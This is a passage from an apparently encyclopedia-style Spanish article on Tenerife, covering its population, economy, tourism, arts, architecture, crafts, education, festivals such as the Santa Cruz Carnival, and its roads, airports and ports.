Además, todos estos municipios se han agrupado tradicionalmente en 8 comarcas. Sin embargo, en 2011 el Cabildo de la isla, a través del Plan Insular de Ordenación de Tenerife, define hasta 11 modelos comarcales, cuyas líneas básicas coinciden en gran medida con las tradicionalmente consideradas en los trabajos que se han realizado sobre la isla desde diversos enfoques. De esta manera, la isla queda dividida en las once comarcas siguientes:


Tenerife es la isla más poblada de Canarias y de España, fruto del crecimiento de la natalidad y de la gran inmigración extranjera que ha recibido la isla en la última década (200 mil inmigrantes residen en Tenerife). La isla albergaba a fecha de 1 de enero de 2017 y según fuentes del INE un total de 894.636 habitantes empadronados.

Se sabe que tras la conquista de Canarias, Tenerife se convirtió rápidamente en la isla más poblada del archipiélago canario, distinción que mantuvo hasta bien entrado el siglo XX. Desde el Censo de Aranda de 1768, Tenerife y Gran Canaria fueron siempre las dos islas más pobladas del Archipiélago, ocupando Tenerife el primer lugar hasta 1940. En el último siglo, Gran Canaria ha sido la más poblada de Canarias, hasta 2002 cuando Tenerife la supera de nuevo.

Actualmente las otras grandes islas españolas que siguen a Tenerife en población son Mallorca con 859.289 habitantes y Gran Canaria con 847.830 habitantes. Alrededor de un 25% de la población total de la isla de Tenerife (222.643 habitantes) lo están en su municipio capital, Santa Cruz de Tenerife, y cerca del 45% (403.013 personas) en su área metropolitana. A diferencia de otras islas de Canarias, Tenerife tiene la población muy dispersa por diferentes ciudades y municipios. Las ciudades de Santa Cruz de Tenerife y San Cristóbal de La Laguna se encuentran urbanísticamente unidas mediante los núcleos poblacionales de La Cuesta y Taco, albergando juntas más de 359.000 habitantes, conformando el Área metropolitana de Santa Cruz de Tenerife, la segunda más poblada de Canarias tras la de Las Palmas de Gran Canaria, siendo la de Santa Cruz de Tenerife además, la decimocuarta en población del país.

- Municipios con más de 25.000 habitantes:

- El municipio de Vilaflor es el que cuenta con menor población de toda la isla (1.843).

En los últimos años Tenerife ha experimentado un notable crecimiento de la población muy por encima de la media estatal.
En el año 1990 un total de 663.306 habitantes estaban censados en la isla, cifra que aumentó hasta los 709.365 habitantes en el año 2000. Esos datos reflejan un incremento en 46.059 personas o lo que es lo mismo, un crecimiento del 0,69% anual en el decenio 1990-2000. Sin embargo, en el intervalo comprendido entre el año 2000 y 2007, la tasa de crecimiento se multiplicó por 4 o por 5 hasta llegar al 3,14% anual. La población ha aumentado en este intervalo de tiempo en un total de 155.705 personas hasta alcanzar la cifra de 865.070 habitantes.

Esos resultados reafirman la dinámica actual de poblaciones en España, donde desde finales del siglo pasado el importante número de inmigrantes llegados ha permitido invertir el panorama que, el hundimiento de la tasa de fertilidad, había dibujado desde 1976. Desde 2001 la tasa de crecimiento en España se ha situado en torno al 1,7% anual contrastando con el 3,14% que ha experimentado la isla de Tenerife, uno de los territorios del Estado que mayor incremento ha sufrido en tal periodo.

Actualmente, Tenerife es la isla que tiene el PIB más alto de Canarias. El presupuesto del Cabildo de Tenerife para 2008 ascendió a 906 millones de euros. A pesar de que la economía tinerfeña está altamente especializada en el sector servicios, que integra un 78,08% de su capacidad de producción total, la importancia del resto de sectores es clave para un desarrollo armónico de su tejido productivo. En este sentido, el sector primario, que solamente representa el 1,98% del producto total, aglutina actividades de especial sensibilidad y para el desarrollo sostenible del territorio insular. El sector energético que contribuye con un 2,85% ejerce un papel primordial en la implantación de energías renovables. El sector industrial que participa en un 5,80% se configura como una actividad de interés creciente para la isla, a la vista de las nuevas posibilidades que generan los avances tecnológicos. Finalmente, el sector de la construcción con un 11,29% del producto total tiene un carácter estratégico prioritario, por cuanto es un sector con relativa estabilidad que permite múltiples posibilidades de desarrollo. La isla es sede de la Caja General de Ahorros de Canarias (CajaCanarias), que con más de 1.600 empleados directos y una red de más de dos centenares de oficinas en todas las islas es la primera entidad financiera del Archipiélago Canario.
Como se indicaba en el párrafo anterior, la economía de Tenerife, al igual que la de otras islas de Canarias, se basa fundamentalmente en el turismo (60% directo del PIB). Ya en el siglo XIX y gran parte del XX destacaba la afluencia de turismo extranjero -sobre todo del inglés- debido a los intereses agrarios que poseía en esta isla. Tenerife atrae gran cantidad de turismo nacional e internacional (es de hecho la isla canaria más visitada turísticamente), los turistas llegan a la isla en busca de sus playas, su variada oferta cultural y su animada vida nocturna.
Más tarde con las guerras mundiales este sector se resiente, pero entrada la segunda mitad del pasado siglo comienza a evolucionar de un modo muy notable. En un principio destaca el Puerto de la Cruz por su bondadoso clima y por todos los atractivos que el Valle norteño de La Orotava concentraba, pero persiguiendo captar el turismo de sol y playa, alrededor de 1980 surge el boom turístico del sur de Tenerife, donde destacan ciudades como Arona o Adeje, en torno a núcleos turísticos como Los Cristianos, Playa de Las Américas y Costa Adeje, que hoy albergan más del 65% de las plazas hoteleras de toda la isla. Tenerife recibe cada año más de 5 millones de turistas, siendo de este modo, de entre todo el archipiélago canario, la isla preferida a este respecto. Sin embargo, este dato también pone de manifiesto la gran cantidad de recursos que esta actividad consume (espacio, energía, agua, etc.).

Gran importancia turística tiene también el Parque nacional del Teide pues es de hecho el segundo parque nacional más visitado del mundo.

Otro atractivo de la isla (con certificación internacional Starlight) que la sitúa entre los destinos más atractivos del planeta es la belleza de su cielo estrellado. Precisamente en el Parque nacional del Teide se encuentra el telescopio Gregor, el más grande de Europa, con el que se puede disfrutar de algunas de las imágenes más espectaculares de las estrellas.

El turismo de negocios y reuniones, como actividad económica, tiene sus orígenes en los últimos años del siglo XIX y en los primeros del siglo XX. No obstante, no fue hasta bien entrada la segunda mitad de ese siglo cuando la denominada “industria de reuniones” se definió y reconoció como tal. Desde entonces las actividades relacionadas con la realización de eventos, de reuniones y congresos, se han ido posicionando en muchos países como uno de los sectores turísticos en alza.

Según la Asociación Internacional de Congresos y Convenciones (ICCA), España es el tercer país del mundo en este tipo de turismo. Actualmente, el turismo de negocio es un valor imprescindible para el desarrollo de la industria turística en general. El 10% de los más de 56 millones de turistas internacionales que llegan anualmente a España lo hacen por motivos de negocio. Estos movimientos generan más de 3.000 millones de euros al año. Es conveniente tener en cuenta que el gasto medio por turista de negocios y día, es de cinco veces mayor que el de un turista vacacional. Sin duda, el elevado poder adquisitivo de este tipo de visitantes es una de las claves de la importancia de este segmento del turismo.

Tenerife cuenta con una infraestructura capaz de albergar grandes y pequeños eventos de prestigio. Dispone de cinco centros de congresos multifuncionales, localizados en diferentes zonas de la Isla. Se trata de edificios emblemáticos, con carácter propio, y con capacidad para reunir hasta 4.000 delegados.

Para ofrecer información y asesoramiento sobre la organización de congresos y convenciones en Tenerife, Turismo de Tenerife cuenta con un departamento especializado, el Tenerife convention bureau.





A pesar de la intensa participación del turismo en el PIB tinerfeño, y en consecuencia el sector servicios, el sector primario, la industria y el comercio son responsables del 40% restante. En concreto el sector primario ha perdido su tradicional importancia en la renta insular en beneficio de la industria y los servicios.

La contribución del sector agrario en el PIB no llega al 10%, si bien su aportación a la isla es vital por cuanto genera beneficios difícilmente mensurables, que se relacionan con el sostenimiento de la estampa rural y el mantenimiento de valores culturales del tinerfeño. El sector agrario se desarrolla en la vertiente septentrional, lugar en el que los cultivos se distribuyen con base en la altitud: en la zona costera se cultivan principalmente tomates y plátanos, productos ambos de elevada rentabilidad dado que se exportan a la Península y al resto de Europa; en la zona intermedia proliferan los cultivos de secano, sobre todo papa, tabaco y maíz; en la zona meridional tiene relevancia el cultivo de la cebolla.

Particularmente, el cultivo del plátano figura en primer lugar en cuanto a producción se refiere, siendo Tenerife la isla que más plátanos manufactura en Canarias. La producción anual de la isla se ha consolidado en torno a unas 150.000 toneladas en estos últimos años, tras haber alcanzado un máximo de 200.000 toneladas en 1986. Algo más del 90% del total se destina al mercado nacional, ocupando este cultivo una superficie de 4200 hectáreas. Detrás del plátano destacan los cultivos de tomates, vides, papas y flores. La pesca supone también gran parte de la economía tinerfeña (Canarias es la segunda región pesquera de España).

El comercio posee un destacado peso en la economía tinerfeña, pues representa casi el 20% del PIB, cuyo mayor baluarte lo supone el Puerto de Santa Cruz de Tenerife. Ya finalmente, y a pesar de los diversos polígonos industriales que existen en el territorio insular, la actividad industrial (10 % del PIB) de mayor importancia es la refinería de petróleos de Santa Cruz de Tenerife, la cual suministra productos petrolíferos no sólo al archipiélago canario sino también al mercado peninsular, africano y americano. La Refinería de Santa Cruz de Tenerife es la industria más grande de Canarias. Históricamente, esta refinería ha garantizado el suministro energético del Archipiélago, ha contribuido de manera importante a la actividad de los puertos canarios, como punto idóneo de repostaje para el tráfico marítimo del Atlántico.

En los siglos XVI y XVII destaca, en el campo de la poesía épica, Antonio de Viana. Este escritor que nace en La Laguna compuso el poema "Antigüedades de las Islas Afortunadas", un material de gran valor antropológico para entender las formas de vida de aquel entonces.

Ya posteriormente, en el llamado Siglo de las Luces (siglo XVIII) aparecen figuras relevantes de la Ilustración en Tenerife como José de Viera y Clavijo y Tomás de Iriarte.

En el siglo XIX hay que situar a Aurelio Pérez Zamora y en la poesía a Ángel Guimerá y Jorge y José Plácido Sansón.

En el siglo XX pueden señalarse, entre otros, los siguientes autores: Agustín Espinosa, Domingo López Torres, Emeterio Gutiérrez Albelo, Mercedes Pinto, Isaac de Vega, Rafael Arozarena, Antonio Bermejo, Luis Feria, Félix Francisco Casanova, Manuel Padorno, Alfonso García-Ramos, Alberto Omar Walls, Luis Alemany, Juan Manuel García Ramos, Juan Cruz Ruiz, Sabas Martín... Por otra parte, como ensayistas hay que destacar a Domingo Pérez Minik, María Rosa Alonso, Juan Manuel Trujillo... Pero es necesario reflejar, que fue la poestisa cubana Dulce María Loynaz la primera en escribir un libro dedicado a esta isla a la cual se sentía unidad por estrechos lazos al ser su esposo natural de ella, titulado "Un verano en Tenerife".
El ámbito musical tiene en la figura de Teobaldo Power y Lugo Viña uno de sus exponentes más claros. Natural de Santa Cruz, se trata de un pianista y compositor, autor de los Cantos Canarios. En concreto, los arreglos de la melodía del arrorró de estos Cantos Canarios constituyen el Himno de la Comunidad Autónoma.
En este campo también destaca el folclore. Similar al del resto de las islas, se caracteriza por la participación de timples, guitarras, bandurrias, laúdes y distintos tipos de instrumentos de percusión.

Son numerosos los grupos folclóricos que se reparten por la geografía isleña y que suelen aparecer en distintas celebraciones populares como las romerías. En este aspecto habría que citar a Los Sabandeños, quienes conforman un importante símbolo de la cultura canaria. Este grupo folclórico rescató la idiosincrasia del pueblo isleño en un momento en el que el carácter uniformador de la cultura española de los años setenta hace caer prácticamente en la decadencia y el olvido diferentes elementos de la música canaria.
Las canciones típicas de las islas: isa, folía, tajaraste, malagueña... se configuran como melodías mestizas entre la música ancestral de los guanches con distintos enlaces entre lo andaluz e hispanoamericano.

El primer núcleo de arte pictórico en Tenerife se distingue en la ciudad de La Laguna, donde en el transcurso del siglo XVI aparecen algunos pintores de renombre. Más adelante se suman artistas de otros lugares como Garachico, Santa Cruz, La Orotava y Puerto de la Cruz. Originarios de La Orotava son dos de los mejores pintores del archipiélago del siglo XVII: Cristóbal Hernández de Quintana y Gaspar de Quevedo, con numerosas obras distribuidas por iglesias de la isla.

En el Puerto de la Cruz, concretamente en la Iglesia de Nuestra Señora de la Peña de Francia, se puede contemplar la aportación realizada por Luis de la Cruz y Ríos. Nacido en 1775, el que fuera pintor de cámara del rey Fernando VII de España y miniaturista, obtiene un reconocido prestigio en la Corte, donde se le conoce como "El Canario".

En el año 1849 nace en Santa Cruz de Tenerife el paisajista Valentín Sanz. El Museo Municipal de Bellas Artes de Santa Cruz cuenta con una abundante muestra de su quehacer. También en este museo capitalino se pueden observar cuadros de Juan Rodríguez Botas (1.880-1.917), quien es considerado el primer impresionista canario.

Del mismo modo cabe citar, dentro del grupo expresionista, a Mariano de Cossío. A este autor hay que atribuirle los frescos de la iglesia de Santo Domingo, en San Cristóbal de La Laguna. Por otro lado, en 1874 nace Francisco Bonnín Guerín, acuarelista de Santa Cruz que formó una escuela para promover su labor pictórica.
Por último, en 1906 nace en Tacoronte uno de los pintores canarios más universales: Óscar Domínguez. Perteneciente a la coriente modernista denominada surrealismo, inventó la técnica de la decalcomanía y contribuyó con una obra pictórica de internacional reconocimiento, gracias, fundamentalmente, a los viajes que realizó a París.

Entre los artistas actuales cabe citar, entre otros, al reconocido Cristino de Vera (Santa Cruz de Tenerife, 1931) quien ha recibido el Premio Nacional de Artes Plásticas en 1998. Recibió también la Medalla de Oro al Mérito en las Bellas Artes en 2001 y el Premio Canarias de Arte en su edición de 2005.Por otro lado se debe señalar a Pedro González (San Cristóbal de La Laguna, 1927) pintor que ejerce labor docente en la Facultad de Bellas Artes y que también resultó galardonado con el Premio Canarias de Arte en 1988.

Se podría considerar que la práctica escultórica comienza en Tenerife a partir del siglo XVII, momento en el cual llega a la isla el arquitecto y escultor Martín de Andújar Cantos desde Sevilla, donde había recibido instrucciones del maestro Juan Martínez Montañés. Con él arribaron nuevas técnicas y planteamientos de la escuela hispalense que transmitió a sus discípulos, entre los que destaca el garachiquense Blas García Ravelo.

Otros escultores que, en esta época y en el posterior siglo XVIII, irrumpen a la escena son Sebastián Fernández Méndez, Lázaro González de Ocampo, José Rodríguez de la Oliva, y principalmente el orotavense Fernando Estévez, alumno de Luján Pérez, quien contribuye con una extensa colección de imágenes religiosas y tallas repartidas por diversas iglesias de Tenerife, como por ejemplo, en la Parroquia Matriz del Apóstol Santiago de Los Realejos; en la Catedral de La Laguna, la Iglesia de la Concepción también en La Laguna, la Basílica de Candelaria, el Real Santuario del Cristo de La Laguna y en distintos lugares de culto de La Orotava.

Actualmente, el ámbito escultórico tinerfeño se encuentra representado entre otros por José Abad, Fernando Garcíarramos y José Luis Fajardo.

Al igual que la que predomina en las otras islas, en la arquitectura tinerfeña sobresalen las directrices de las casonas señoriales y las de las casas más humildes y populares. Este tipo arquitectónico, que tiene notables influencias de Andalucía y Portugal, presenta, no obstante una fuerte personalidad propia.

De las casas señoriales hay que subrayar los ejemplos que existen en La Orotava y en La Laguna. Estas edificaciones se caracterizan por sus balcones típicos y por la presencia de patios interiores. La madera, especialmente la tea (pino), cobra un gran protagonismo en estas construcciones. Estas casas presentan fachadas no demasiado complejas con poca ornamentación.

Son típicos los grandes balcones de madera y el uso de celosías. Las ventanas cierran en guillotina y son habituales los asientos interiores adosados a ellas. Los patios interiores funcionan como verdaderos jardines que sirven para dar iluminación a las habitaciones. Estas se comunican con el patio por medio de galerías rematadas frecuentemente en piedra y madera. Artilugios como las destiladeras, las bombas de agua, los bancos y mesones son elementos que muchas veces forman parte de estos patios interiores.

En cuanto a las casas tradicionales, éstas se caracterizan por ser edificios de escasa altura, con toscas paredes de colores variopintos. En ocasiones la continuidad de estas paredes se ve interrumpida por la presencia de bloques de piedra que asoman a la superficie de forma ornamental. A lo largo de toda la isla son muchos los ejemplos a contemplar de esta arquitectura.

Los edificios oficiales o de carácter religioso se han ido conformando según las distintas corrientes arquitectónicas que en cada momento han imperado. Los núcleos urbanos de las ciudades de La Laguna y La Orotava están declarados como monumentos histórico-artístico nacionales.

Otra muestra arquitectónica presente en la isla la representan los edificios defensivos que se erigieron a modo de torres o pequeños castillos tras la conquista castellana. Estas construcciones tuvieron la finalidad de proteger a la isla de ataques piráticos, o de incursiones foráneas, como la del almirante inglés Horatio Nelson en julio de 1797. Entre estos fortines se podrían citar en la capital tinerfeña el Castillo de San Cristóbal, el Castillo de San Andrés o el Castillo de San Juan o Castillo Negro. En el norte de la isla también se emplazan algunas de estas edificaciones como el Castillo de San Miguel en Garachico o el Castillo de San Felipe en el Puerto de la Cruz, entre otros.

En los últimos años, por parte de los diferentes gobiernos, ha predominado el concepto de llevar a cabo grandes proyectos, en ocasiones ostentosos, diseñados por reconocidos arquitectos. Entre ellos se podría incluir por ejemplo, la remodelación de la Plaza de España por los arquitectos suizos Herzog & De Meuron, el nuevo proyecto del francés Dominique Perrault de la Playa de Las Teresitas, el centro Magma Arte & Congresos, las Torres de Santa Cruz o el Auditorio de Tenerife. Este último edificio, obra del arquitecto español Santiago Calatrava, se alza al noreste del Parque Marítimo en Santa Cruz de Tenerife. Uno de sus elementos más destacables es la estampa de su vela alada simulando un barco, que lo ha convertido en el emblema arquitectónico de la ciudad de Santa Cruz.

En esta breve sección habría que remarcar la elaboración del calado y la roseta, dos elementos artesanales apreciados también por los visitantes de la isla. El calado es una labor de bordado, que requiere gusto, paciencia y precisión, fundamentada en una técnica consistente en ir deshilando un paño tensamente sujeto a un bastidor por lo general de madera. El resultado final suele aplicarse, sobre todo, a la mantelería u otros elementos decorativos. La roseta se confecciona substancialmente en el municipio de Vilaflor, y consiste en crear dibujos con hilos que son cruzados entre fijadores. Estas pequeñas piezas así elaboradas son unidas posteriormente obteniéndose paños individuales y composiciones.
Estas dos variedades artesanales, que precisan de una gran dedicación, suelen venderse en núcleos etnográficos o rurales o en cascos históricos. Sin embargo, es frecuente encontrar en las céntricas calles de Santa Cruz y otros puntos turísticos numerosos locales que ofrecen lo que ellos denominan "mantelería canaria", cuando ésta es realmente producida en serie mediante procedimientos industriales y no responde por tanto a los trabajos artesanales confeccionados en Canarias.

En este ámbito hay que destacar igualmente la ebanistería. El norte de Tenerife ha proporcionado a la historia varios maestros en la talla que han contribuido con elementos que van desde balcones, celosías, puertas y ventanas hasta un original mobiliario cargado de objetos elaborados en madera fina. La cestería también es una labor de cierto peso en la artesanía tinerfeña donde sus artesanos trabajan desde hojas de palma y varas de castaño a la fibra de la platanera, conocida por el sector como la badana, que conlleva una producción igualmente diversa y heterogénea.

Existe, como en el resto de las Islas Canarias, toda una tradición artesana alrededor de la alfarería. El uso del barro procede de la primitiva cerámica llevada a cabo por los antiguos guanches, quienes desconocían el uso del torno. Los alfareros de la isla trabajan la arcilla con las manos, lo que imprime una gran autenticidad a sus obras. Entre los objetos realizados destacan los destinados a la utilería doméstica, asadores, gánigos…, o los meramente ornamentales y de atavío personal: collares de cuentas o las afamadas pintaderas, un símbolo de la iconografía aborigen.

Es habitual poder contemplar los quehaceres de estos artesanos en diferentes ferias que normalmente se suelen celebrar con motivo de las fiestas de los pueblos, villas o ciudades de la isla.

El nacimiento de la educación se debe en la isla a las órdenes religiosas. En el año 1530, Tenerife accede a la cultura de la mano de la cátedra de filosofía que, poseen los dominicos en el convento de La Concepción de La Laguna. A pesar de ello, hasta bien avanzado el siglo XVIII no comienzan a funcionar las pocas escuelas que por aquel entonces existían.

En este sentido, hay que recalcar el trabajo desempeñado por la Real Sociedad Económica de Amigos del País, que creó diversas escuelas en San Cristóbal de La Laguna. Fue en 1846 cuando se instaura el primer instituto de enseñanza secundaria con el fin de suplir el cierre de la Universidad de San Fernando ("véase" Universidad de La Laguna). Anexa a este edificio se fundó en 1850 la primera Escuela Normal Elemental del archipiélago que pasaría a denominarse Escuela Normal Superior de Magisterio en 1866. Así se mantiene esta situación ya que a pesar de que el dictador Miguel Primo de Rivera crease algunos centros, el punto de inflexión lo supone la política educativa que desarrolló la Segunda República, de modo que en apenas cuatro años (1929-1933) casi se dobla el número de escuelas existentes.

Posteriormente, el inicio de la Guerra Civil y la ulterior dictadura de Francisco Franco constituyeron un considerable retroceso. La educación en manos de órdenes religiosas tuvo cierta importancia en el devenir de los tinerfeños hasta que en 1970 la Ley General de Educación resta peso a estas instituciones religiosas en favor de los centros públicos. Estos últimos, y ya en menor grado los primeros, comienzan a multiplicarse desde entonces y son impulsados con la instauración de la democracia. Tenerife cuenta a día de hoy con 301 centros de educación infantil, 297 colegios de primaria, 140 de secundaria y 86 institutos de bachiller. Además, en la isla existen hasta 5 centros de estudios universitarios o de postgrado: Universidad de La Laguna (la de mayor presencia), Universidad Nacional de Educación a Distancia, Universidad Internacional Menéndez Pelayo, Universidad Alfonso X el Sabio y Universidad de Vich (Escuela Universitaria de Turismo de Santa Cruz de Tenerife).

También hay que destacar la Universidad Europea de Canarias que se encuentra en La Orotava y que es la primera universidad privada del archipiélago.

El campo de la investigación, históricamente, no se ha desarrollado de un modo especialmente relevante. No obstante, entre los centros que se dedican a esta labor destaca sobre todo el Instituto de Astrofísica de Canarias que tiene sede en esta isla.

Asimismo cabría citar el Instituto de Bio-Orgánica Antonio González, vinculado a la Universidad de La Laguna. También adheridos a esta universidad se encuentran el Instituto de Lingüística Andrés Bello, el Centro de Estudios Medievales y Renacentistas, el Instituto Universitario de la Empresa, el Instituto de Derecho Regional y el Instituto Universitario de Ciencias Políticas y Sociales al igual que el Instituto de Enfermedades Tropicales (perteneciente a la Red de Investigación de Centros de Enfermedades Tropicales, que dispone de siete nodos extendidos a lo largo del país, uno de ellos en Canarias).

Con sede en la ciudad del Puerto de la Cruz se encuentra el Instituto de Estudios Hispánicos de Canarias, adscrito al Instituto de Cultura Hispánica de Madrid. En la ciudad de La Laguna se encuentra la delegación canaria del Consejo Superior de Investigaciones Científicas (CSIC), el Instituto Canario de Investigaciones Agrarias, el Instituto de Estudios Canarios y el Centro Internacional para la Conservación del Patrimonio.

Otros organismos que trabajan en el ámbito de la investigación que tienen sede en Tenerife son el Instituto Tecnológico de Canarias, el Instituto Vulcanológico de Canarias, la Asociación Industrial de Canarias, el Instituto Tecnológico de Energías Renovables y el Instituto Oceanográfico de Canarias emplazado en la ciudad de Santa Cruz de Tenerife.

La isla cuenta con diversos recintos museísticos de diferente naturaleza que están bajo el dominio de distintas instituciones. Quizás los más destacados sean los pertenecientes al Organismo Autónomo de Museos y Centros, que dispone de los siguientes espacios:







Desligados del Organismo Autónomo de Museos y Centros destacan:










Tenerife tiene un amplio calendario festivo en el que destaca principalmente el Carnaval de Santa Cruz de Tenerife, el más importante del país y uno de los más importantes del mundo. El día oficial de la isla es el 2 de febrero en honor de la Virgen de Candelaria (Patrona de Canarias), celebrada en ese día como fiesta insular en Tenerife, mientras que la festividad del 15 de agosto se une al día de la Asunción de María en todo el orbe católico y es la fiesta dedicada a esta Virgen que cuenta con representaciones de las diferentes islas del archipiélago. Otras fiestas destacables son sus romerías, el Corpus Christi, la Semana Santa y la fiesta del Santísimo Cristo de La Laguna el 14 de septiembre.

Quizás la fiesta tinerfeña de mayor repercusión nacional e internacional sea el Carnaval de Santa Cruz de Tenerife, no en vano declarado . Aparte de la capital, el carnaval se celebra en múltiples localidades del norte y sur de la isla, pero es en la primera donde tiene mayor envergadura. Son diversos los concursos que se programan: murgas, comparsas, rondallas, agrupaciones, etc. Con la elección de la reina adulta se pone fin a éstos y comienza lo que los tinerfeños denominan carnaval en la calle con importantes concentraciones de carnavaleros en el centro de Santa Cruz, que se prolongan durante diez días de fiesta.

Las fiestas populares más tradicionales y extendidas en Tenerife son quizás las romerías. Éstas, a caballo entre lo pagano y lo religioso son manifestaciones multitudinarias con carrozas o carretas, aperos y ganado en honor al patrón o patrona del lugar. Es frecuente en estos festejos la reunión de marcados factores identitarios de la etnografía isleña: folclore, danza, artesanía, comida típica, deportes autóctonos, donde se puede observar a gran parte de los asistentes ataviados con los diferentes trajes de mago típicos de las islas.

En origen las romerías encarnaban fiestas de las clases más adineradas de la sociedad, que se congregaban en veneración de los santos a los que atribuían buenas cosechas, tierras fértiles, copiosidad de lluvias, exoneración de determinadas enfermedades y un largo etcétera. En consecuencia, los allí reunidos degustaban los alimentos y vinos de la tierra y, brindaban y compartían sus bienes rindiendo así pleitesía. Estas celebraciones se fueron popularizando paulatinamente y dieron paso a una de las fiestas más emblemáticas de la actualidad. Dentro de las grandes romerías de la isla cabe señalar las romerías de San Marcos en Tegueste, donde las carretas son decoradas con productos del campo (semillas, cereales, flores, etc), San Isidro Labrador en Los Realejos, San Isidro Labrador y Santa María de la Cabeza en La Orotava, la Romería de la Virgen de Candelaria en la Villa Mariana de Candelaria, El Socorro de Güímar, San Benito Abad en La Laguna, San Isidro Labrador en Tacoronte, San Roque en Garachico o la de San Agustín en Arafo.

La Virgen de Candelaria es la Patrona de Canarias. Su fiesta es celebrada dos veces al año, en febrero y en agosto. La Romería-Ofrenda a la Virgen de Candelaria se celebra cada 14 de agosto. En este acto es tradición que representaciones de todos los municipios de la isla y también de todas las islas del Archipiélago Canario acudan a ofrendar a su Patrona. Otro acto significativo de la fiesta de la Virgen de Candelaria es la peregrinación a la Villa Mariana realizada en la noche del 14 al 15 de agosto, en la cual los fieles recorren andando multitud de kilómetros desde diferentes partes de la isla hasta llegar a la Villa Mariana de Candelaria, lugar donde se encuentra la venerada imagen de la Virgen de Candelaria. Es habitual recibir peregrinos de otras islas e incluso de otras partes de España. La Fiesta de la Virgen de Candelaria del 15 de agosto tiene la consideración de "Fiesta de Interés Turístico Nacional de España".

El 2 de febrero se celebra la Fiesta Litúrgica de La Candelaria. También en este día se acercan a la villa muchos fieles de la "Virgen Morenita". Es también tradición que cada siete años la imagen de la Virgen sea trasladada alternativamente por dos semanas a las ciudades de Santa Cruz de Tenerife (capital) y San Cristóbal de La Laguna (sede de la diócesis). Las últimas dos veces que se ha efectuado dicho traslado han sido en octubre de 2002 a Santa Cruz y en mayo de 2009 a La Laguna. El próximo traslado se realizará de manera excepcional en 2018 a ambas ciudades en coincidencia con las celebraciones con motivo de los actos conmemorativos de los 200 años de la creación de la Diócesis de Tenerife.

Esta Festividad Litúrgica que, tiene varios siglos de historia, es celebrada cada 14 de septiembre en la ciudad de San Cristóbal de La Laguna y gira en torno al Santísimo Cristo de La Laguna. El Cristo de La Laguna es una de las imágenes más veneradas de las Islas Canarias y especialmente en la isla de Tenerife junto con la Virgen de Candelaria. Es la imagen Cristológica más venerada de Canarias, y una de las imágenes religiosas más antiguas del archipiélago.

Cada 9 de septiembre la venerada imagen del Cristo es bajada en público del altar mayor de su Real Santuario, para el rito del besapiés y para más tarde ser colocada en el trono procesional, para sus fiestas mayores de septiembre. La imagen permanece en su trono procesional hasta el 21 de septiembre, día en que la sagrada imagen es subida de nuevo a su altar. Durante este tiempo la imagen es solemnemente trasladada hasta la Catedral de La Laguna (9 de septiembre), en la cual procesiona en una cruz repujada en plata. En dicha catedral permanece durante varios días, hasta el día 14 de septiembre, cuando se procede al traslado de vuelta a su Real Santuario.

Con marcado carácter religioso se encuentra la festividad del Corpus Christi, en la que es habitual la confección de alfombras florales en las calles. A título especial se pueden incluir las realizadas en La Orotava, donde se puede contemplar un tapiz de considerables dimensiones confeccionado en la plaza del ayuntamiento mediante tierras volcánicas de diversas tonalidades, extraídas del Parque nacional del Teide que, tras la celebración son devueltas a fin de respetar el entorno del Parque. La festividad del Corpus Christi de La Orotava está declarada Bien de Interés Cultural en la categoría de Actividad Tradicional de Ámbito Insular. En La Laguna la festividad del Corpus Christi tiene también una especial significación, pues es considerada como la procesión más antigua de Canarias.

En el capítulo de celebraciones a reseñar de la isla de Tenerife habría que contar con la Semana Santa. Ésta se celebra en todos los municipios pero probablemente sea en San Cristóbal de La Laguna (que de hecho esta Semana Santa ostenta el honorable título de ser la más antigua e importante del Archipiélago Canario), Santa Cruz de Tenerife, La Orotava y Los Realejos donde adquiera especial significado. En este sentido destacan principalmente las procesiones que se desarrollan durante el Jueves Santo, Viernes Santo y Domingo de Resurrección.

Tenerife posee comunicaciones por tierra, mar y aire. La isla posee dos grandes autopistas; la Autopista del Sur y la Autopista del Norte, dos aeropuertos internacionales; el Aeropuerto de Tenerife Sur y el Aeropuerto de Tenerife Norte y dos grandes puertos; El de Santa Cruz de Tenerife y el de Los Cristianos. Lo que la convierten en la isla canaria que más pasajeros registra, tanto por mar como por aire, con más de cinco millones de pasajeros anualmente.

Las principales comunicaciones que se producen en Tenerife se establecen por carretera. Las más importantes son la Autopista del Sur y la Autopista del Norte, que parten desde la zona metropolitana hacia las zonas sur y norte respectivamente. Estas dos autopistas están conectadas a través de la Autovía de Interconexión Norte-Sur también en las afueras del área metropolitana. Dentro de la red de carreteras de la isla existen otras de menor importancia que las anteriores pero cabe destacar la Autovía de San Andrés y la Autovía de Penetración de Santa Cruz de Tenerife, ambas en Santa Cruz de Tenerife.

Asimismo está previsto la construcción de una autovía de circunvalación norte del área metropolitana de Santa Cruz de Tenerife-La Laguna. Esta autovía pretende comunicar los núcleos de Guamasa y Acorán, a través de Los Baldíos, Centenero, Llano del Moro, El Sobradillo, El Tablero, El Chorrillo, entre otros barrios. La vía tendrá aproximadamente 20 km y un coste estimado de 190 millones de euros.

El principal medio para llegar a Tenerife es el avión. Existen dos aeropuertos en la isla: el Aeropuerto de Tenerife Sur y el Aeropuerto de Tenerife Norte, el primero situado en el sur de la isla y con un tráfico turístico dominante, mientras que el segundo está situado en el área metropolitana y tiene un tráfico principalmente regional y doméstico. A pesar de que el aeropuerto de Tenerife Sur es el que recibe mayor número de pasajeros, ambos son aeropuertos internacionales que disponen de vuelos regulares tanto con otras islas como con diferentes puntos de la península Ibérica (Madrid, Barcelona, Sevilla, Valencia, Málaga, Bilbao, etc.) y del extranjero, especialmente con otros países de la Unión Europea y Venezuela. Teniendo en cuenta los dos aeropuertos, Tenerife es la isla canaria que anualmente recibe mayor número de pasajeros.

Debido al turismo, es fácil encontrar vuelos directos más económicos con las principales ciudades alemanas o británicas que con las peninsulares.

Además del avión, Tenerife tiene dos puertos marítimos principales que le sirven de conexión. El Puerto de Santa Cruz que conecta con las capitales de cada isla, y en particular con aquellas de la provincia oriental, y el Puerto de Los Cristianos que se centra en mayor medida en las comunicaciones con las capitales de la provincia de Santa Cruz de Tenerife. Además es posible el tráfico de pasajeros entre los Puertos de Santa Cruz de Tenerife y Cádiz y viceversa. En 2017 abrió un gran puerto de importancia en el sur de la Isla, el de Granadilla, y está previsto la construcción de otro en la parte oeste, en Fonsalía.

El Puerto de Los Cristianos y el Puerto de Santa Cruz de Tenerife son, respectivamente, el primero y el segundo en tráfico de pasajeros de Canarias, de los puertos que dependen del Estado. Asimismo, el Puerto de Santa Cruz de Tenerife es el que más pasajeros de crucero y vehículos en régimen de pasaje registra del conjunto del archipiélago.

